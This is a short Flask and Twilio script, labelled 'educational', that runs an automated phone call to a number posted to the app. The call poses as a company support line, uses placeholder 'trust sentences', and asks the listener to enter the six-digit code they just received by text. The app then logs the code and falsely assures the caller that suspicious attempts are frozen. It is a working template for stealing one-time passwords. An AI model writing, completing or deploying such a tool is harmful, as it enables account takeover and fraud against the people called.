# ONLY EXAMPLE CODES ABOUT CALL METHOD FOR EDUCATIONAL PURPOSES.

from flask import Flask, request, Response
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather

app = Flask(__name__)

account_sid = 'your_account_sid'
auth_token = 'your_auth_token'
twilio_number = '+1234567890'
client = Client(account_sid, auth_token)

@app.route("/start-call", methods=["POST"])
def start_call():
    to_number = request.form.get("to")
    if not to_number:
        return "Missing 'to' number", 400

    call = client.calls.create(
        to=to_number,
        from_=twilio_number,
        url="https://your-server.com/voice"
    )
    return {"status": "call started", "sid": call.sid}

@app.route("/voice", methods=["POST"])
def voice():
    response = VoiceResponse()
    
    gather = Gather(
        input="dtmf",
        num_digits=6,
        timeout=10,
        action="/gather",
        method="POST"
    )
    gather.say("Hello. This is <scriptname> support line. <trustsentences>. <trustsentences1>. Please enter the <digitnumber> digit code you just received via text message.")
    
    response.append(gather)
    response.say("We didn't receive any input. Goodbye.")
    return Response(str(response), mimetype="text/xml")

@app.route("/gather", methods=["POST"])
def gather():
    digits = request.form.get("Digits")
    
    print(f"[INFO] User entered OTP: {digits}")  # Log for educational purposes
    
    response = VoiceResponse()
    response.say("Thank you. We have received your code securely. We'll freeze all suspicious attempts just now, Goodbye.")
    return Response(str(response), mimetype="text/xml")

if __name__ == "__main__":
    app.run(port=5000)
